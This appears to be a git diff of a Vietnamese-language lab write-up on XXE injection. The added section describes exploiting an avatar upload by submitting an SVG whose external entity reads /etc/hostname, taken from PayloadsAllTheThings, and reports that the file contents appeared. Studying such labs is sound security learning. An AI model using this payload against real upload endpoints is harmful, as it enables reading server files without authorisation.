@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/fec71b7a-2c45-415e-bc58-6dcd860f9253)
+![image](https://github.com/user-attachments/assets/bd775a09-6e97-4334-aeba-81c501483e52)![image](https://github.com/user-attachments/assets/fec71b7a-2c45-415e-bc58-6dcd860f9253)
 
 Trong web có cái check stock dùng xml:
 
@@ -158,19 +158,36 @@ Nhưng khi tôi chèn 1 cái entity vào thì nó hiện ra "Entities are not al
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/76f77e4c-6d60-466d-8e69-1915d07b4dd9)
 
+Lần này thì lỗi nằm ở upload avatar:
 
+![image](https://github.com/user-attachments/assets/31f65523-ad3c-4bc1-8718-9f1431197780)
 
+Tôi thử upload svg lên vì nó ở dạng xml:
 
+![image](https://github.com/user-attachments/assets/095d1281-33c6-48d0-9ac3-27f6386d2a1d)
 
+Do svg ở dạng xml nên tôi có tham khảo qua payload ở [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) và tìm được cái này:
 
+![image](https://github.com/user-attachments/assets/5f90535d-d784-4123-9997-d105924b7749)
 
+```
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
 
+![image](https://github.com/user-attachments/assets/422a7ee4-56ab-475b-aff2-6d0c46b39efb)
 
+Tải lại trang và vào thì có cái nội dung của /etc/hostname:
 
+![image](https://github.com/user-attachments/assets/b2dbdde6-5198-4413-9b57-cb16a0e216dd)
 
-
-
+<h1>---------------------------------------------------------</h1>
+<br>
 
 
 
